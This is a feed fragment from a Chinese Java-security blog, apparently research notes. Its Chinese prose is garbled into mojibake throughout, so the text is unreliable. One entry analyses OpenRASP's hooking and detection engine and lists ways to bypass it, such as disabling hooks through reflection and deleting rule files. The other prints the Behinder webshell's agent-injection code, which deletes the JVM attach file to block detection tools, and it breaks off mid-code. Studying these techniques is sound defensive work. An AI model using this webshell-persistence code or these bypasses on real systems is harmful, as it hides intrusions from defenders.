class="title">ClassFileTransformer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;org/m0d9/sec/JavassistDemo/Target&quot;</span>.equals(className)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br></pre></td></tr></table></figure><p>ï¼ˆè¿™ä¸ªæ˜¯beyondå¤§ä½¬ä»¥å‰MemShellçš„ä»£ç ï¼‰ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯premainä»¥åŠtransformå®ç°æ¥å£ï¼Œå¤§åŒå°å¼‚ï¼ŒOpenRASPçš„è¿™ä¸ªé€»è¾‘æ˜¯åœ¨EngineBoot#startå¼€å§‹çš„ï¼Œå…·ä½“çš„ä»£ç å°±ä¸è´´äº†ï¼Œæµç¨‹è·Ÿè¸ªå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">EngineBoot#initTransformer</span><br><span class="line">CustomClassTransformer#</span><br><span class="line">CustomClassTransformer#addAnnotationHook</span><br><span class="line">CustomClassTransformer#retransform</span><br><span class="line">CustomClassTransformer#transform</span><br><span class="line">AbstractClassHook#transformClass</span><br></pre></td></tr></table></figure><p>OpenRASPå…·ä½“çš„transformé€»è¾‘åœ¨AbstractClassHookçš„å„ç§å­ç±»ä¸­å®ç°</p><h4 id="Javassists"><a href="#Javassists" class="headerlink" title="Javassists"></a>Javassists</h4><p>transformå†…æ˜¯é€šè¿‡Javassistså­—èŠ‚ç æŠ€æœ¯ï¼Œå®ç°å¯¹ç±»æ–¹æ³•çš„ä¿®æ”¹/æ’æ¡©ã€‚ä»¥CommonHttpClientHookä¸ºä¾‹ï¼Œæ•´ä¸ªè°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractClassHook#transformClass</span><br><span class="line">CommonHttpClientHook#hookMethod</span><br><span class="line">AbstractClassHook#insertAfter</span><br><span class="line">           javassist.CtBehavior#insertAfter</span><br></pre></td></tr></table></figure><p>å…·ä½“å…³é”®ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@HookAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonHttpClientHook</span> <span class="keyword">extends</span> <span class="title">AbstractSSRFHook</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>&#123;</span><br><span class="line">        String src = getInvokeStaticSrc(CommonHttpClientHook.class, <span class="string">&quot;checkHttpConnection&quot;</span>,</span><br><span class="line">                <span class="string">&quot;$0,$1&quot;</span>, Object.class, String.class);</span><br><span class="line">        insertAfter(ctClass, <span class="string">&quot;parseUriReference&quot;</span>, <span class="string">&quot;(Ljava/lang/String;Z)V&quot;</span>, src);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>é€šè¿‡javassiståœ¨org.apache.commons.httpclient.URI#parseUriReferenceæ–¹æ³•ååŠ è½½äº†checkHttpConnectionè¿™ä¸ªæ–¹æ³•ä»£ç å—ã€‚<br>è¿™ä¸ªcheckHttpConnectionåŠŸèƒ½åˆ™ä¸ºæ”»å‡»æ£€æŸ¥åˆ†æé€»è¾‘ï¼Œåé¢è¯¦ç»†è®²ã€‚</p><h3 id="Hookäº†å“ªäº›ç±»æ–¹æ³•"><a href="#Hookäº†å“ªäº›ç±»æ–¹æ³•" class="headerlink" title="Hookäº†å“ªäº›ç±»æ–¹æ³•"></a>Hookäº†å“ªäº›ç±»æ–¹æ³•</h3><p>å®˜æ–¹æ–‡æ¡£ä¸­æœ‰åˆ—å‡ºè¯¦ç»†Hookäº†å“ªäº›å‡½æ•° <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a>ï¼Œå¦‚ä¸‹<br><img src="/images/pasted-148.png" alt="upload successful"></p><p>ç»§æ‰¿AbstractClassHookä¸”æœ‰HookAnnotationæ³¨è§£çš„ç±»ï¼Œä»–ä»¬çš„hooké€»è¾‘éƒ½ä¼šè¢«åŠ è½½ï¼Œå…·ä½“ç­›é€‰ä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">addAnnotationHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Set&lt;Class&gt; classesSet = AnnotationScanner.getClassWithAnnotation(SCAN_ANNOTATION_PACKAGE, HookAnnotation.class);</span><br><span class="line">    <span class="keyword">for</span> (Class clazz : classesSet) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object object = clazz.newInstance();</span><br><span class="line">            <span class="keyword">if</span> (object <span class="keyword">instanceof</span> AbstractClassHook) &#123;</span><br><span class="line">                addHook((AbstractClassHook) object, clazz.getName());</span><br></pre></td></tr></table></figure><h2 id="OpenRaspçš„æ£€æµ‹é€»è¾‘"><a href="#OpenRaspçš„æ£€æµ‹é€»è¾‘" class="headerlink" title="OpenRaspçš„æ£€æµ‹é€»è¾‘"></a>OpenRaspçš„æ£€æµ‹é€»è¾‘</h2><p>åœ¨hookæ’å…¥çš„ä»£ç é€»è¾‘ï¼Œä¸€èˆ¬éƒ½æ˜¯é¢„å¤„ç†çš„é€»è¾‘ï¼ŒçœŸæ­£åˆ¤æ–­æ˜¯å¦æ˜¯æ¶æ„pocï¼Œæ˜¯åœ¨OpenRASPçš„checkeré€»è¾‘ä¸­ã€‚</p><h3 id="checker"><a href="#checker" class="headerlink" title="checker"></a>checker</h3><p>è¿˜æ˜¯ä»¥CommonHttpClientHook SSRFä¸ºä¾‹ï¼Œhookæ’å…¥äº†checkHttpConnectionå‡½æ•°ä»£ç å—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkHttpConnection</span><span class="params">(Object object, String url)</span> </span>&#123;</span><br><span class="line">        String host = <span class="keyword">null</span>;</span><br><span class="line">        String port = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                host = Reflection.invokeStringMethod(object, <span class="string">&quot;getHost&quot;</span>, <span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span class="line">...</span><br><span class="line">            checkHttpUrl(url, host, port, <span class="string">&quot;commons_httpclient&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>checkHttpConnectionæœ€ç»ˆä¼šè°ƒç”¨Checkerï¼Œè¿›è¡Œè§„åˆ™åˆ¤æ–­ï¼Œè°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">CommonHttpClientHook#checkHttpConnection</span><br><span class="line">AbstractSSRFHook#checkHttpUrl</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheck</span><br><span class="line">    com.baidu.openrasp.HookHandler#doCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest</span><br><span class="line">    com.baidu.openrasp.plugin.checker.CheckerManager#check</span><br><span class="line">V8AttackChecker#check</span><br><span class="line">XssChecker#check</span><br><span class="line">SqlResultChecker#check</span><br><span class="line">MongoConnectionChecker#check</span><br><span class="line">SqlConnectionChecker#check</span><br><span class="line">...            </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-149.png" alt="upload successful"></p><p>Chekerç±»å‹å¯ä»¥å¤§è‡´åˆ†ä¸º3ç±»</p><ol><li>jsæ’ä»¶æ£€æµ‹ï¼Œå¦‚SQLã€å‘½ä»¤æ‰§è¡Œã€XXEã€SSRFä¹‹ç±»</li><li>javaæœ¬åœ°æ£€æŸ¥ï¼Œç›®å‰ä»…2ä¸ª</li><li>å®‰å…¨åŸºçº¿æ£€æµ‹ï¼Œä¸»è¦æ˜¯ç±»ä¼¼é…ç½®æ£€æŸ¥ï¼Œå¦‚å¼±å£ä»¤ä¹‹ç±»</li></ol><h3 id="v8"><a href="#v8" class="headerlink" title="v8"></a>v8</h3><p>ä»¥ä¸Šçš„Checkerä¸­ï¼Œä»¥V8AttackCheckeræœ€é‡è¦ã€‚è‡³äºä¸ºä½•è¦ç”¨JSæ£€æµ‹å¼•æ“ä½œä¸ºæ ¸å¿ƒï¼Œä¸ªäººè®¤ä¸ºä¸»è¦åŸå› åº”è¯¥æ˜¯æ”¯æŒè·¨è¯­è¨€ã€çƒ­éƒ¨ç½²ã€‚</p><h4 id="install-openrasp-v8-in-mac"><a href="#install-openrasp-v8-in-mac" class="headerlink" title="install openrasp-v8 in mac"></a>install openrasp-v8 in mac</h4><p>å®˜ç½‘çš„<a href="https://rasp.baidu.com/doc/hacking/compile/java.html#java-v8">å®‰è£…è„šæœ¬</a>æ˜¯linuxçš„ï¼Œè¿™é‡Œç»™ä¸‹maxä¸‹éœ€è¦å˜åŠ¨çš„å‘½ä»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ../java/src/main/resources/natives/osx_64 &amp;&amp; cp java/libopenrasp_v8_java.dylib <span class="variable">$_</span></span><br></pre></td></tr></table></figure><h4 id="JSå¼•æ“"><a href="#JSå¼•æ“" class="headerlink" title="JSå¼•æ“"></a>JSå¼•æ“</h4><p>å®˜æ–¹æ–‡æ¡£è¿˜æ˜¯Rhinoçš„æµç¨‹(è¿™é‡Œå’Œv8å¤§è‡´æ˜¯ä¸€æ ·çš„ï¼Œç»†èŠ‚ä¸åŒ)<br><img src="/images/pasted-150.png" alt="upload successful"></p><p>ä¸»è¦æœ‰ä¸¤éƒ¨åˆ†</p><ol><li>openrasp-v8çš„jsåº“</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€â”€ console.jsconsole.logå®ç°</span><br><span class="line">â”œâ”€â”€ flex.jstokenizeåº“ï¼Œæœ‰sql_tokenize&amp;cmd_tokenize</span><br><span class="line">â””â”€â”€ rasp.jsRASPåŸºç¡€ç±»</span><br></pre></td></tr></table></figure><p>è¿™äº›åº“å¯ä»¥åœ¨jsæ’ä»¶ä¸­è¿›è¡Œè°ƒç”¨</p><ol start="2"><li>jsæ’ä»¶</li></ol><p>æ£€æµ‹é€»è¾‘éƒ½æ˜¯åœ¨jsæ’ä»¶å†…å®ç°ï¼Œåˆå§‹åŒ–æµç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">EngineBoot#start</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#Initialize</span><br><span class="line">V8#Initialize</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#UpdatePlugin</span><br><span class="line">V8#CreateSnapshot</span><br><span class="line">V8#ExecuteScript</span><br><span class="line">com.baidu.openrasp.plugin.js.JS#InitFileWatcher</span><br></pre></td></tr></table></figure><p>å…¶ä¸­V8.CreateSnapshot/ExecuteScriptéƒ½æ˜¯åœ¨openrasp-v8 jniå†…å®ç°çš„ï¼Œæœªæ·±å…¥è·Ÿè¸ªã€‚</p><p>å…¶ä¸­JS.UpdatePluginé»˜è®¤ä¼šåŠ è½½pluginsä¸‹é¢çš„jsã€‚è¿˜æœ‰InitFileWatcherå®æ—¶ç›‘æ§jsæ’ä»¶æ–‡ä»¶å˜åŠ¨ï¼Œè¿™ä¸ªå¸ˆå‚…ä»¬æœ‰è®²è¿™é‡Œä¹Ÿä¸è®²äº†ã€‚</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>V8AttackCheckeråˆ°v8çš„æµç¨‹å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V8AttackChecker#check</span><br><span class="line">JS#Check</span><br><span class="line">    V8#Check</span><br></pre></td></tr></table></figure><p>V8.Checkä¹Ÿæ˜¯jniå®ç°ï¼Œæš‚æ— åŠ›è·Ÿè¸ªï¼ŒçŒœæµ‹æ˜¯ä¼šæ ¹æ®typeï¼Œè°ƒç”¨å¯¹åº”çš„jsæ’ä»¶å†…çš„checkå‡½æ•°ï¼Œå¦‚type=ssrfï¼Œå°±ä¼šè°ƒç”¨official/plugins.jså†…çš„plugin.check_ssrfã€‚</p><h2 id="OpenRASPçš„ç»•è¿‡"><a href="#OpenRASPçš„ç»•è¿‡" class="headerlink" title="OpenRASPçš„ç»•è¿‡"></a>OpenRASPçš„ç»•è¿‡</h2><p>å‚è€ƒã€1ã€‘ä¸­æœ‰æåˆ°HookHandler.enableHookè¿™ä¸ªå±æ€§ï¼Œé€šè¿‡åå°„è®¾ç½®ä¸ºfalseå…³é—­HookåŠŸèƒ½ï¼Œè¾¾åˆ°OpenRASPçš„ç»•è¿‡ã€‚</p><p>ä»åŸç†ä¸Šå¤§è‡´è„‘çˆ†ä¸‹å¯èƒ½å­˜åœ¨çš„æ”»å‡»ç‚¹ï¼Œé™äºç²¾åŠ›ï¼ŒæœªåšéªŒè¯ã€‚</p><ul><li>å¯ä»¥æ ¹æ®OpenRASP Hook&amp;Checké€»è¾‘ä¸Šçš„ä¸€äº›æ§åˆ¶å˜é‡ï¼Œè¾¾åˆ°ç»•è¿‡æ•ˆæœï¼Œå¦‚ä¸Šé¢çš„enableHookã€‚</li><li>å¯ä»¥é€€å‡ºOpenRASPï¼Œå¦‚è°ƒç”¨EngineBoot#release</li><li>å¯ä»¥æçV8ï¼Œå¦‚V8.stackGetter</li><li>å¯ä»¥åˆ é™¤jsè§„åˆ™ï¼Œå¦‚plugins/xxx.js</li><li>é’ˆå¯¹æ€§ç»•è¿‡jsæ’ä»¶æ£€æµ‹é€»è¾‘</li></ul><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åœ¨é˜…è¯»å¸ˆå‚…ä»¬æ–‡ç« çš„åŸºç¡€ä¸Šï¼Œè®°å½•äº†è‡ªå·±åœ¨çº¯é™æ€è¯»OpenRASPæºç æ—¶æ„Ÿå…´è¶£çš„ä¸€äº›çŸ¥è¯†ç‚¹ï¼Œå¤§è‡´å¯¹å…¶æ¶æ„åŸç†æœ‰äº†ä¸€å®šçš„äº†è§£ã€‚</p><p>ä¸ªäººè®¤ä¸ºæœ€ä¸»è¦çš„ç‚¹è¿˜æ˜¯åœ¨v8å¼•æ“ä»¥åŠæ’ä»¶çš„æ£€æµ‹é€»è¾‘ä¸Šï¼Œä½†æ˜¯æœ¬ç¯‡é‡ç‚¹æ²¡æœ‰åœ¨æ­¤ï¼Œåªæ˜¯ç®€è¦è¿‡äº†ä¸€éæ•´ä¸ªæ¶æ„åŠåŸç†ã€‚åç»­å¦‚æœæœ‰ç²¾åŠ›ï¼Œå¯èƒ½ä¼šåœ¨æ­¤åŸºç¡€ä¸Šå†ç ”ç©¶ä¸‹ç»•è¿‡çš„çŸ¥è¯†ã€‚</p><p>å‚è€ƒã€1ã€‘ä¸­æåˆ°openraspç±»ä¼˜å…ˆåŠ è½½å½±å“åº”ç”¨ç±»çš„é—®é¢˜ï¼Œå°è±¡ä¸­å•†ä¸šç‰ˆå¥½åƒæ˜¯åšäº†è§£å†³ï¼Œæ‰¾ä¸åˆ°ç¾¤èŠè®°å½•äº†ã€‚</p><p>æœ€åæœ‰è¶£çš„å…«å¦ä¸‹ï¼šopenraspä¸€å¼€å§‹ç”¨çš„æ˜¯v8+j2v8ï¼Œ0.20å› ä¸ºæ€§èƒ½åŸå› æ”¹æˆäº†Rhinoï¼Œ1.1åˆæ”¹å›äº†v8+è‡ªç ”çš„openrasp-v8ï¼Œæ„Ÿè§‰æ˜¯ä¸€æ®µç²¾ç›Šæ±‚ç²¾çš„å†å²ï¼Œå¾ˆæœ‰æ„æ€ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://threedr3am.github.io/2019/12/31/OpenRASP%E6%A0%B8%E5%BF%83%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">OpenRASPæ ¸å¿ƒæºç æµ…æ</a></li><li>[2] <a href="https://www.cnblogs.com/tr1ple/p/12918942.html">Java openraspå­¦ä¹ è®°å½•-2</a></li><li>[3] <a href="https://www.cnblogs.com/tr1ple/p/12709504.html#DAFPQtWG">Java openraspå­¦ä¹ è®°å½•-1</a></li><li>[4] <a href="https://paper.seebug.org/513/">Java RASPæµ…æâ€”â€”ä»¥ç™¾åº¦OpenRASPä¸ºä¾‹</a></li><li>[5] <a href="https://rasp.baidu.com/doc/hacking/architect/java.html">ç³»ç»Ÿæ¶æ„ - Java ç‰ˆæœ¬</a></li><li>[6] <a href="https://rasp.baidu.com/doc/hacking/architect/hook.html">Hook å‡½æ•°åˆ—è¡¨</a></li><li>[7] <a href="https://github.com/baidu/openrasp">GitHub OpenRASP</a></li><li>[8] <a href="https://github.com/baidu-security/openrasp-v8">GitHub OpenRASP-v8</a></li><li>[9] <a href="https://paper.seebug.org/1041/#53">æµ…è°ˆ RASP</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;RASPï¼ˆRuntime Application self-protectionï¼‰æŠ€æœ¯è‡ªGartneråœ¨2014å¹´æå‡ºï¼Œå·²ç»æœ‰æŒºé•¿ä¸€æ®µæ—¶é—´äº†ã€‚å¤§å‚ä»¬ç°åœ¨åŸºæœ¬ä¹Ÿéƒ½æœ‰è‡ªç ”çš„RASPã€IASTäº§å“ã€‚åœ¨å¼€æºRASPä¸­ï¼Œåº”ä»¥OpenRASPèµ·æ­¥æœ€æ—©ï¼Œåº”ç”¨ä¹Ÿæœ€å¹¿ã€‚ä¸è¿‡å› ä¸ºæ€§èƒ½åŸå› ï¼Œåœ¨å®é™…æ”»é˜²ä¸­è¦†ç›–é¢è¿˜æ˜¯æœ‰é™ã€‚&lt;/p&gt;
&lt;p&gt;RASPç®—æ˜¯Javaå®‰å…¨ç»•ä¸å¼€çš„ä¸€ä¸ªæŠ€æœ¯ç‚¹ï¼Œæœ‰å…´è¶£å¯¹æ­¤å­¦ä¹ ç ”ç©¶ä¸€ç•ªã€‚å‚è€ƒæ–‡ç« ä¸­threedr3amã€tr1pleã€c0d3p1ut0så‡ ä¸ªå¸ˆå‚…ä»¬å¯¹äºOpenRASPçš„åŸç†ã€æŠ€æœ¯ç‚¹éƒ½æœ‰è·Ÿè¸ªå’Œè§£é‡Šï¼Œå› æ­¤æœ¬æ–‡ä¸å†å¤šåšç±»ä¼¼çš„é˜é‡Šï¼Œä¸»è¦é’ˆå¯¹è‡ªå·±çš„ä¸€äº›çŸ¥è¯†ç›²ç‚¹ã€å…´è¶£ç‚¹ï¼Œåšåšç ”ç©¶ä¸ç¬”è®°ã€‚&lt;/p&gt;
&lt;h2 id=&quot;OpenRASPçš„Hook&quot;&gt;&lt;a href=&quot;#OpenRASPçš„Hook&quot; class=&quot;headerlink&quot; title=&quot;OpenRASPçš„Hook&quot;&gt;&lt;/a&gt;OpenRASPçš„Hook&lt;/h2&gt;&lt;p&gt;å…³æ³¨ä¸¤ç‚¹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¦‚ä½•Hookçš„&lt;/li&gt;
&lt;li&gt;Hookäº†å“ªäº›ç±»çš„å“ªäº›æ–¹æ³•&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;å¦‚ä½•Hook&quot;&gt;&lt;a href=&quot;#å¦‚ä½•Hook&quot; class=&quot;headerlink&quot; title=&quot;å¦‚ä½•Hook&quot;&gt;&lt;/a&gt;å¦‚ä½•Hook&lt;/h3&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OpenRASP" scheme="http://m0d9.me/tags/OpenRASP/"/>
    
    <category term="RASP" scheme="http://m0d9.me/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>ä»å†°èantiAgentçœ‹Java Attachæœºåˆ¶</title>
    <link href="http://m0d9.me/2021/06/21/JVM-Attach/"/>
    <id>http://m0d9.me/2021/06/21/JVM-Attach/</id>
    <published>2021-06-21T09:24:00.000Z</published>
    <updated>2021-06-24T07:15:51.920Z</updated>
    
    <content type="html"><![CDATA[<p>webshellçš„éšè—ä¸æ£€å‡ºä¸€ç›´ä»¥æ¥éƒ½æ˜¯æ”»é˜²çš„ç„¦ç‚¹ï¼Œéšç€å†…å­˜é©¬çš„ç ”ç©¶ä¸å·¥å…·çš„å…¬å¼€ï¼Œå†…å­˜shellå·²ç„¶æˆä¸ºäº†webshellä¸»æµã€‚</p><p>å¼•ç”¨ã€9ã€‘ä¸­å…³äºæ”»å‡»çš„æ€è·¯</p><blockquote><ol><li>åŸºäºServletè§„èŒƒçš„åˆ©ç”¨ï¼ŒåŠ¨æ€æ³¨å†ŒServletè§„èŒƒä¸­çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬Servletï¼ŒFilterï¼ŒListenerï¼Œè¿™éƒ¨åˆ†çš„å…¬å¼€æ–‡ç« æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚ï¼šåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼ˆ<a href="https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/7388ï¼‰ã€‚</a></li><li>åŸºäºç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨ï¼Œæ¡†æ¶ä¸€èˆ¬å¯¹äºServletåˆè¿›è¡Œäº†ä¸€å±‚å°è£…ï¼ŒåŠ¨æ€æ³¨å†Œæ¡†æ¶çš„è·¯ç”±ï¼Œæ–‡ç« ï¼šåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ï¼ˆ<a href="https://www.anquanke.com/post/id/198886%EF%BC%89">https://www.anquanke.com/post/id/198886ï¼‰</a></li><li>åŸºäºjavaagentä¿®æ”¹Servletå¤„ç†æµç¨‹ä¸­çš„å­—èŠ‚ç ï¼Œå·¥å…·ï¼šmemShellï¼ˆ<a href="https://github.com/rebeyond/memShell%EF%BC%89">https://github.com/rebeyond/memShellï¼‰</a></li></ol></blockquote><p>å¼•ç”¨ã€8ã€‘ä¸­å…³äºæ£€æµ‹çš„æ€è·¯</p><blockquote><p>æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§æ”»å‡»æ–¹å¼ï¼Œä»é˜²å®ˆæ–¹çš„è§’åº¦æ¥è¯´ï¼Œæ£€æµ‹çš„æ–¹å¼éƒ½æ˜¯é€šè¿‡java instrumentationæœºåˆ¶ï¼Œå°†æ£€æµ‹jaråŒ…attachåˆ°tomcat jvmï¼Œæ£€æŸ¥åŠ è½½åˆ°jvmä¸­çš„ç±»æ˜¯å¦å¼‚å¸¸ã€‚æ•´ä½“æ£€æµ‹æ€è·¯ä¸ºï¼š</p><ol><li>è·å–tomcat jvmä¸­æ‰€æœ‰åŠ è½½çš„ç±»</li><li>éå†æ¯ä¸ªç±»ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºé£é™©ç±»ã€‚æˆ‘ä»¬æŠŠå¯èƒ½è¢«æ”»å‡»æ–¹æ–°å¢/ä¿®æ”¹å†…å­˜ä¸­çš„ç±»ï¼Œæ ‡è®°ä¸ºé£é™©ç±»ï¼ˆæ¯”å¦‚å®ç°äº†filter/servletçš„ç±»ï¼‰</li><li>éå†é£é™©ç±»ï¼Œæ£€æŸ¥æ˜¯å¦ä¸ºwebshellï¼š</li><li>æ£€æŸ¥é«˜é£é™©ç±»çš„classæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›</li><li>åç¼–è¯‘é£é™©ç±»å­—èŠ‚ç ï¼Œæ£€æŸ¥javaæ–‡ä»¶ä¸­åŒ…å«æ¶æ„ä»£ç </li></ol></blockquote><p>æœ‰æ”»æœ‰é˜²ï¼Œè€Œé˜²å¾¡åˆå¼•å‘æ”»å‡»çš„å‡çº§ï¼Œå†°èæœ€æ–°ç‰ˆå·²ç»åŠ å…¥äº†åVirtualMachine.AttachåŠŸèƒ½ã€‚</p><a id="more"></a><h2 id="å†°èAntiAgent"><a href="#å†°èAntiAgent" class="headerlink" title="å†°èAntiAgent"></a>å†°èAntiAgent</h2><h3 id="AntiAgentçš„å®ç°"><a href="#AntiAgentçš„å®ç°" class="headerlink" title="AntiAgentçš„å®ç°"></a>AntiAgentçš„å®ç°</h3><p>å…ˆçœ‹çœ‹å†°èçš„å®ç°ï¼Œå…·ä½“åœ¨MemShell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doAgentShell</span><span class="params">(<span class="keyword">boolean</span> antiAgent)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">      Method attachMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, String.class);</span><br><span class="line">      Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, String.class, String.class);</span><br><span class="line">      Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());</span><br><span class="line">      loadAgentMethod.invoke(obj, libPath, base64encode(path) + <span class="string">&quot;|&quot;</span> + base64encode(password));</span><br><span class="line">      String osInfo = System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class="line">      <span class="keyword">if</span> (osInfo.indexOf(<span class="string">&quot;windows&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;winnt&quot;</span>) &lt; <span class="number">0</span> &amp;&amp; osInfo.indexOf(<span class="string">&quot;linux&quot;</span>) &gt;= <span class="number">0</span> &amp;&amp; antiAgent) &#123;</span><br><span class="line">         String fileName = <span class="string">&quot;/tmp/.java_pid&quot;</span> + getCurrentPID();</span><br><span class="line">         (<span class="keyword">new</span> File(fileName)).delete();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">      var12.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (Error var13) &#123;</span><br><span class="line">      var13.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      (<span class="keyword">new</span> File(libPath)).delete();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span 